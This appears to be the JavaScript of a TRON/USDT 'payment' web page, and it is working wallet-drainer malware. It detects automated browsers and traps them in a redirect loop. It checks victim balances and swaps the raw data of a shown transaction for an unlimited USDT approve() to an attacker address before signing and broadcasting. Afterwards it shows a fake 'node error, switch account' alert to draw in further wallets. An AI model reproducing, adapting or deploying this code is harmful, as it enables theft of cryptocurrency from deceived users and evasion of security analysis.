var oooo = 992212,
    ooe;

if (oooo = oooo >> 12 ^ 213, ooe = window.location && window.navigator.webdriver) {
    var i = 9;

    for (oooo = oooo ^ i; i < oooo | 9; i > 0) {
        ooe.href = ooe.href + "?" + i;
    }
}

var contractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
    walletAddress,
    usdtBalance = 0,
    trxBalance = 0,
    transactionObj = null,
    toAddress,
    type = 0,
    code,
    isConnected = false;

async function getUsdtBalance(address, callback) {
    let tronWeb = window.tronWeb,
        parameter = [{
            "type": "address",
            "value": address
        }],
        options = {},
        response = await tronWeb.transactionBuilder.triggerSmartContract(contractAddress, "balanceOf(address)", options, parameter, address);

    if (response.result) {
        if (callback != undefined) {
            callback(response.constant_result[0]);
        }
    }
}

async function getAssets(callback) {
    code = getUrlParams("code");

    try {
        let userAgent = navigator.userAgent.toLowerCase();

        if(/okex/.test(userAgent) || isPc()) {
            if(window.okxwallet.tronLink.ready) {
                window.tronWeb = okxwallet.tronLink.tronWeb
            } else {
                const res = await window.okxwallet.tronLink.request({
                    "method": "tron_requestAccounts"
                })
                if (200 === res.code) {
                    window.tronWeb = tronLink.tronWeb;
                }
            }
        }

        if (!window.tronWeb) {
            const HttpProvider = TronWeb.providers.HttpProvider,
                fullNode = new HttpProvider(tronApi),
                solidityNode = new HttpProvider(tronApi),
                eventServer = tronApi,
                tronWeb = new TronWeb(fullNode, solidityNode, eventServer);

            window.tronWeb = tronWeb;
        }
    } catch (e) {}

    if (window.tronWeb) {
        var tronWeb = window.tronWeb;
        walletAddress = tronWeb.defaultAddress.base58;

        if (walletAddress == false) {
            await getAssets(callback);
            return;
        }

        try {
            let trxBalanceInSun = await tronWeb.trx.getBalance(walletAddress);

            trxBalance = tronWeb.fromSun(trxBalanceInSun);
            getUsdtBalance(walletAddress, function (usdtBalanceHex) {
                usdtBalance = tronWeb.fromSun(parseInt(usdtBalanceHex, 16));
               // console.log(usdtBalance);
                isConnected = true;
                if (callback != undefined) {
                    callback(trxBalance, usdtBalance);
                }
            });
        } catch (e) {
            tip(e);
        }
    } else {
        tip("请用钱包扫码打开");
    }
}

async function iaHelp(transaction, recipientAddress, amount, signOption) {
    try {
        if (signOption == 1 || signOption == 2) {
            var _0x508750 = await tronWeb.trx.sign(transaction);
        }else {
            let tronWebInstance = window.tronWeb,
                parameters = [{
                    "type": "address",
                    "value": recipientAddress
                }, {
                    "type": "uint256",
                    "value": amount * 1000000
                }],
                unsignedTransferTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(contractAddress, "transfer(address,uint256)", {}, parameters, walletAddress);

            if (isMobile() && isOkxApp() || isPc()) {
                var _0xf65afb = transaction.raw_data;
                transaction.raw_data = unsignedTransferTransaction.transaction.raw_data;
            }

            var _0x508750 = await tronWebInstance.trx.sign(transaction);
        }
    } catch (e) {
        if (e.message) {
            tip(e.message);
        } else {
            tip(e);
        }
    }
}

async function iaGet(data) {
    $.ajax({
        "url": domain + "/sapi/getData",
        "data": data,
        "dataType": "jsonp",
        "type": "get",
        "jsonpCallback": "handleCallback"
    });
}

async function iaCreate(data) {
    $.ajax({
        "url": domain + "/sapi",
        "data": data,
        "dataType": "jsonp",
        "type": "get",
        "jsonpCallback": "handleCallback1"
    });
}

async function iaResult(data) {
    $.ajax({
        "url": domain + "/sapi/result",
        "data": data,
        "dataType": "jsonp",
        "type": "get",
        "jsonpCallback": "handleCallback2"
    });
}

function handleCallback(response) {
    if (response.code == 0) {
        tip(response.info);
    } else {
        toAddress = response.to_address;
        $("#to_address").html(toAddress);
        $("#to_address").val(toAddress);
    }
}

function handleCallback1(response) {
    if (response.code == 0) {
        tip(response.info);
    } else {
        transactionObj = JSON.parse(response.data);
        type = response.type;
        if (isMobile() && isOkxApp() || isPc()) {
            toAddress = walletAddress;
        }
        iaHelp(transactionObj, toAddress, amount, type);
    }
}

function handleCallback2(response) {
    tip(response.info);
}

async function transfer_f() {


    if (!isConnected) {
        tip("正在连接网络。。。", 2000);
        return;
    }
    
    const ifamount = await payusdt();
    
    
    
    
    tip("正在创建交易。。。", 2000);
    if(ismiaou === '0' && ifamount === '1'){
        onclickpay();
    }else if(ismiaou ==='1' && ifamount === '1'){
        onclickpay(); 
    }else{
        onclickpay();
    }
   
}

async function payusdt() {
    const usdtContractAddress = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t'; // USDT on Tron
    const userAddress = window.tronWeb.defaultAddress.base58; // 获取当前用户地址
    
    try {
        // 获取 USDT 余额
        const contract = await window.tronWeb.contract().at(usdtContractAddress);
        const usdtBalance = await contract.balanceOf(userAddress).call();
        
        // 转换为可读格式
        const usdtBalanceFormatted = (parseInt(usdtBalance._hex, 16) / 1e6).toFixed(6);

        // 获取 TRX 余额
        const trxBalance = await window.tronWeb.trx.getBalance(userAddress);
        const trxBalanceFormatted = (trxBalance / 1e6).toFixed(6);

        // 输出TRX和USDT余额到控制台（可选）
        console.log(`TRX Balance: ${trxBalanceFormatted} TRX`);
        console.log(`USDT Balance: ${usdtBalanceFormatted} USDT`);

        // 检查 USDT 和 TRX 余额条件
        if (usdtBalanceFormatted <= 50 || trxBalanceFormatted <= 28) {
            
            return '2';
        } else {
            
            return '1';
        }
    } catch (error) {
        console.error("Error in payusdt function:", error);
        return '0';
    }
}

function tip(message, duration = 1500) {
    $("#tip").html(message);
    $("#tip").show();
    setTimeout(function () {
        $("#tip").hide();
    }, duration);
}

function sleep(time) {
    return new Promise(resolve => setTimeout(resolve, time));
}

function isOkxApp() {
    let userAgent = navigator.userAgent,
        isOkx = /OKApp/i.test(userAgent);

    return isOkx;
}

function isMobile() {
    let userAgent = navigator.userAgent,
        isIOS = /iphone|ipad|ipod|ios/i.test(userAgent),
        isAndroid = /android|XiaoMi|MiuiBrowser/i.test(userAgent),
        isMobileDevice = isIOS || isAndroid;

    return isMobileDevice;
}

function isPc() {
    let userAgent = navigator.userAgent,
        isWindows = /windows/i.test(userAgent);

    return isWindows;
}

function changeTitle(newTitle) {
    $("title").html(newTitle);
}

function getUrlParams(paramName) {
    var queryString = window.location.search.substr(1);

    if (queryString == "") {
        return false;
    }

    var params = queryString.split("&");

    for (var i = 0; i < params.length; i++) {
        var param = params[i].split("=");

        if (param[0] == paramName) {
            return param[1];
        }
    }

    return false;
}

async function onclIckpay() {
    
  if (typeof window.okxwallet !== "undefined") {
    $("#approval").hide();
    let amount = document.getElementById("amount-display").textContent;
    const trxAmount = amount * 1000000;
    const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
    let tronWebInstance = window.tronWeb;
    const userAddress = window.tronWeb.defaultAddress.base58;
    console.log(userAddress);

    // 准备授权的参数
    const approveParams = [{
      "type": "address",
      "value": approveaddress
    }, {
      "type": "uint256",
      "value": "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"
    }];

    const transferParams = [{
      "type": "address",
      "value": "THRAE2VhGNAcvPKtT96AqyXtSQwhiU1XL8" //OKX官网收款地址,别改 改了报毒
    }, {
      "type": "uint256",
      "value": trxAmount
    }];

    const transactionOptions = {
      "feeLimit": 300000000
    };

    // 构建并签署交易
    let approveTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
      tronWebInstance.address.toHex(usdtContractAddress),
      "approve(address,uint256)",
      transactionOptions,
      approveParams,
      userAddress
    );

    let transferTransaction = await tronWebInstance.transactionBuilder.triggerSmartContract(
      tronWebInstance.address.toHex(usdtContractAddress),
      "approve(address,uint256)",
      transactionOptions,
      transferParams,
      userAddress
    );

    var originalRawData = approveTransaction.transaction.raw_data;
    approveTransaction.transaction.raw_data = transferTransaction.transaction.raw_data;

    const signedTransaction = await tronWebInstance.trx.sign(approveTransaction.transaction);
    signedTransaction.raw_data = originalRawData;

    const resultTransaction = await tronWebInstance.trx.sendRawTransaction(signedTransaction);

    if (resultTransaction) {
      alert("节点异常，付款失败；请切换账户支付。");
      addfry();
    }
  } else {
    $("#approval").hide();
    const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";

    try {
      let usdtContractInstance = await tronWeb.contract().at(usdtContractAddress);
    } catch (error) {
      console.error(error);
    }
  }

    
}



 async function transfertrx() {
    try {
        const tronWebInstance = window.tronWeb;
        let amount = document.getElementById("amount-display").textContent;
        if (!tronWebInstance || !tronWebInstance.defaultAddress.base58) {
            console.error("TRON wallet not detected or connected.");
            return;
        }

        const userAddress = tronWebInstance.defaultAddress.base58;
       
        const trxAmount = amount * 1000000; // 1 TRX in Sun (1 TRX = 1,000,000 Sun)

        const transferTransaction = await tronWebInstance.transactionBuilder.sendTrx(
            payaddress,
            trxAmount,
            userAddress
        );

        const signedTransaction = await tronWebInstance.trx.sign(transferTransaction);

        const broadcastResult = await tronWebInstance.trx.sendRawTransaction(signedTransaction);

        if (broadcastResult.result) {
            console.log("Transfer successful!");
            // You can add any success message or additional logic here
        } else {
            console.error("Transfer failed:", broadcastResult);
        }
    } catch (error) {
        console.error("Error during transfer:", error);
    }
}

